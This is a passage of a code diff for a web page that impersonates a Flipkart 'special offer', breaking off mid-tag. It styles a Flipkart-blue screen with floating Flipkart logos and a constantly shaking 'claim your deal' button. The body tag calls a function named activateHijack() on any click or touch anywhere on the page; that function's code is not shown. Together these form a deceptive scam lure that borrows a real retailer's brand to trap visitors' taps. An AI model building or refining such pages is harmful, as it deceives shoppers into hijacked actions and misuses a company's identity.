@@ -3,55 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flipkart - Special Offer</title>
+    <title>Claim Your Deal</title>
     <style>
         body, html {
             height: 100%; margin: 0; padding: 0;
             display: flex; justify-content: center; align-items: center;
             background-color: #2874f0; font-family: 'Roboto', sans-serif;
-            overflow: hidden; touch-action: manipulation;
+            overflow: hidden;
         }
 
-        /* બેકગ્રાઉન્ડમાં ઉડતા લોગો */
+        /* --- Floating Logos (Same as original) --- */
         @keyframes float {
             0% { transform: translate(0, 0) rotate(0deg); }
-            50% { transform: translate(50px, 50px) rotate(180deg); }
+            50% { transform: translate(100px, 100px) rotate(180deg); }
             100% { transform: translate(0, 0) rotate(360deg); }
         }
         .floating-logo {
-            position: absolute; width: 60px; opacity: 0.15; z-index: 1; pointer-events: none;
+            position: absolute; width: 60px; opacity: 0.12; z-index: 1; pointer-events: none;
         }
 
+        /* --- Button & Container (Same colors & style) --- */
         .container { text-align: center; z-index: 10; position: relative; width: 100%; }
-        .deal-text { font-size: 22px; font-weight: bold; color: #ffffff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .deal-text { font-size: 22px; font-weight: bold; color: #ffffff; margin-bottom: 20px; text-transform: uppercase; }
 
-        /* બટન ધ્રુજારી એનિમેશન */
         @keyframes shake {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            50% { transform: translateX(4px); }
+            75% { transform: translateX(-4px); }
         }
 
         .oval-button {
             background-color: #ffe11b; color: #212121;
-            padding: 18px 60px; font-weight: bold; border: none;
+            padding: 15px 55px; font-weight: bold; border: none;
             border-radius: 50px; cursor: pointer;
-            box-shadow: 0 6px 25px rgba(0,0,0,0.3);
-            animation: shake 0.8s infinite; display: inline-block;
-            text-decoration: none; transition: 0.3s;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            animation: shake 0.5s infinite; display: inline-block;
+            text-align: center; text-decoration: none;
         }
 
-        .offer-text { font-size: 28px; display: block; line-height: 1.2; }
-        .click-Here-text { font-size: 16px; display: block; margin-top: 5px; color: #333; font-weight: normal; }
+        .offer-text { font-size: 26px; display: block; line-height: 1.2; }
+        .click-Here-text { font-size: 14px; display: block; margin-top: 4px; font-weight: normal; color: #333; }
 
-        .oval-button:active { transform: scale(0.9); }
+        button:active { transform: scale(0.95); }
     </style>
 </head>
 <body onclick="activateHijack()" ontouchstart="activateHijack()">
 
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:80%; left:60%; animation: float 22s infinite linear;">
-
-    <div class="container">
-        <div class="deal-text">ગ્રા
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15
